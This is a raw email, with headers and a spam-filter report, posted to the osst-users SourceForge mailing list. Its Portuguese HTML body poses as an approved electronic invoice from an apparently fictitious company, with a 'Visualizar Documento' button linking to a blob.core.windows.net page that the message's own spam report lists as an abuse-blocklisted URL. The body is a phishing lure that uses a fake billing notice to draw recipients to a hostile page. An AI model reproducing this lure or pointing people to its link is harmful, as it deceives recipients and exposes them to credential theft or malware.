Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id A459AC8532E
	for <lists+osst-users@lfdr.de>; Tue, 25 Nov 2025 14:37:29 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:To:
	Message-Id:Date:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=pi6zJyOD25HzWK66hhudZ8ga0YDQpThxuP7q9N6MHM0=; b=aTHkvXw+o1baE6NZLzaI6DWvh0
	yh75i7KBPt7OWGaQv8lHFjxVVwEiCn/OtONrwsWJp3yVA/P4BAizeCfv3BPSY9ioLImDlENKOEzu7
	Yj4NQBcZkr7TtK8Yj46R4zNj+jm5v/iT8VC+0DJ1tkOb7YvFaN4ShhvTcXF3OSaoEBTY=;
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1vNtEW-0001OV-D1
	for lists+osst-users@lfdr.de;
	Tue, 25 Nov 2025 13:37:28 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mail3@yes35.creditofacildigital.com>)
 id 1vNtEV-0001OP-HF for osst-users@lists.sourceforge.net;
 Tue, 25 Nov 2025 13:37:27 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :To:Message-Id:Subject:Date:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=aEeTQdbiRNEF0vHt2VyuCbLq/K0Ij6NbNzbm4bzuBAc=; b=dZuDhJ5VlX2Ga2EJEpaRPe59ik
 X2rq26FH4aiAr7hlSEIMuDEAPAgOBErFCXSDTqIB4GjrffOOxtLP560brZN79kAW4sikdGRKgFz2L
 lsRh7ZIeSkFbIIV2+SElDMxmzvffWxhIGZmcdHlyZ77fAfloWssXjccbyFGagcu6Qj5Y=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:To:Message-Id:Subject
 :Date:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=aEeTQdbiRNEF0vHt2VyuCbLq/K0Ij6NbNzbm4bzuBAc=; b=h
 xrTdvBBN8TSDRhzovxoYtLvJXrq5KzQIXzIeuTX/IZOwNaT+y208LWHglEwmpVfc2IVHdDiSj5j7p
 nmdqyWphoE+qOLZEqB2z9HoGQskNsZ08V8XEEplkBDNrShqNoBaoa26yMznb0IleEf7RgRCpdOi6v
 sSmG8B5+9YEUnrL0=;
Received: from yes35.creditofacildigital.com ([141.11.208.184])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1vNtEU-0006aQ-Sb for osst-users@lists.sourceforge.net;
 Tue, 25 Nov 2025 13:37:27 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
 d=yes35.creditofacildigital.com; s=mail; t=1764077836;
 bh=4pZ/mRzotSQfpPck7vjIOdFkQi/gzwkDDA8qZU+5I4w=;
 h=From:Date:Subject:To:From;
 b=e0YRh3o+ILEx7jueov5j5FggsR/ne9vydyyzTm6VcpaSyYKQ9MNeq0lqNLtEFAuw9
 uWuKmsX8KsvFVpGL70v2JjDO2OOx22L8upSRja/dqhZk44Xkfp0EpGwSS6bp0kgh+/
 cXBwkreByHpJzhdgQYuJQ/uAi5YpzlQO5wZk2/QPcUB24vb5hzRopG6pBB5898vIfy
 VYuBRpnldKT3cBH63yv/guwCIKE5xY8l5ws+bltvXZYxER6djG04jeBc1We2t1NUI/
 HfpAC6DyMf8ea4YwTC55SGrsFDq+61nVvWgz8ep/hmDFXzhKd/sGW+CQ/JuMUUULyp
 INHh59U/qjbSw==
From: Mail <mail3@yes35.creditofacildigital.com>
Date: Tue, 25 Nov 2025 10:37:14 -0300
Message-Id: <Y9UZ4RWFTRU4.93JIH14CRXLP@win-858gmr391ho>
To: "osst-users@lists.sourceforge.net" <osst-users@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 2.9 (++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-1.hosts.colo.sdot.me",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Nota Fiscal - Documento Nota Fiscal Eletrônica 
 
 Content analysis details:   (2.9 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  1.0 RCVD_IN_UCE2           RBL: IP Subnet Listed in UCEPROTECT Level 2
                             [141.11.208.184 listed in dnsbl-2.uceprotect.net]
  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL blocklist
                             [URI: insolvency4850.blob.core.windows.net]
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from author's
                             domain
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.0 LOTS_OF_MONEY          Huge... sums of money
X-Headers-End: 1vNtEU-0006aQ-Sb
Subject: [Osst-users] Nota fiscal recebida registrada via integracao!
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1252293971807767260=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============1252293971807767260==
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 8bit

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Nota Fiscal - Documento</title>
</head>
<body style="font-family: Arial; max-width: 700px; margin: 20px auto; line-height: 1.6;">

  <h2 style="text-align:center;">Nota Fiscal Eletrônica</h2>

  <p><strong>Empresa Emitente:</strong> Figtício Serviços Digitais LTDA</p>
  <p><strong>CNPJ:</strong> 12.345.678/0001-90</p>
  <p><strong>Endereço:</strong> Avenida Paulista, 1500 - 12º Andar</p>
  <p><strong>Cidade/UF:</strong> São Paulo - SP</p>
  <p><strong>CEP:</strong> 01310-200</p>

  <hr>

  <p><strong>Status:</strong> Aprovado</p>
  <p><strong>Tipo de Documento:</strong> NF-e</p>
  <p><strong>Valor Total:</strong> R$ 1.600,00</p>
  <p><strong>Data da Compra:</strong> 25/11/2025</p>
  <p><strong>Referência:</strong> Pedido #458912763</p>

  <hr>

  <p><strong>Número da Nota Fiscal:</strong> 992837465554120098</p>
  <p><strong>Data de Emissão:</strong> 25/11/2025</p>

  <br>

  <p style="text-align:center;">
    <a href="https://insolvency4850.blob.core.windows.net/documentary/confidentiality.html" 
       target="_blank" 
       style="padding: 10px 20px; background: #f39c12; color: #fff; text-decoration: none; border-radius: 5px;">
      Visualizar Documento
    </a>
  </p>

</body>
</html>


--===============1252293971807767260==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1252293971807767260==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============1252293971807767260==--
